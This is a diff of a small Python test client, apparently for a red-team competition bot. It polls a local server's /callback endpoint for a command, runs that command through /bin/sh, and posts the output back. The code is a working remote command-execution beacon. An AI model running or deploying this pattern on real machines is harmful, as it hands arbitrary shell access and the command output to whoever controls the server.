@@ -4,45 +4,61 @@ A sample python client which implements the bot for testing
 
 import os
 import requests
+import json
 import subprocess
 
+def jprint(data):
+    string = json.dumps(data, indent=2)
+    string = "\t" + string.replace("\n", "\n\t") + "\n"
+    print(string)
 
 def main():
     server = "http://127.0.0.1:5000"
-    ip = "10.80.100.26"
+    ip = "192.168.177.195"
     team = "5"
 
-    print("Getting commands: ", end="")
-    url = "{}/{}/{}/linux".format(server, team, ip)
-
+    print("[*] GET to {}/callback:".format(server))
     # Get the commands from the server
-    resp = requests.get(url)
-    if resp.status_code != 200:
-        print("Fail")
-        quit(1)
-    print("Success")
+    data = {
+        "team": team,
+        "ip": ip,
+    }
+    jprint(data)
+    resp = requests.get(server + "/callback", json=data).json()
+    print("[+] Response:")
+    jprint(resp)
 
-    commands = resp.content
+    if "printf" in resp['command']:
+        print(resp['command'])
+    if "error" in resp:
+        print("[!]", resp["error"])
+        quit(1)
+
     # Run the commands
-    print("Running the process: ", end="")
+    print("[*] Running the process...")
     try:
         proc = subprocess.Popen(
             "/bin/sh", stdin=subprocess.PIPE, stdout=subprocess.PIPE
         )
-        stdout, stderr = proc.communicate(commands)
+        stdout, stderr = proc.communicate(resp['command'].encode("utf-8"))
         proc.terminate()
     except Exception as E:
-        print("Fail:", E)
+        print("[!] Failure:", E)
         quit(1)
 
-    print("Success")
     # Send the results back to the same URL but as a POST
-    print("Validating Results: ", end="")
-    resp = requests.post(url, stdout.decode("utf-8"))
-    if resp.status_code != 200:
-        print("Fail:", resp.content.decode("utf-8"))
-        quit(1)
-    print("Success")
+    print("[*] POST to {}/callback:".format(server))
+
+
+    data = {
+        "id": resp['id'],
+        "results": stdout.decode("utf-8")
+    }
+    jprint(data)
+
+    resp = requests.post(server + "/callback", json=data).json()
+    print("[+] Response:")
+    jprint(resp)
 
 
 if __name__ == "__main__":
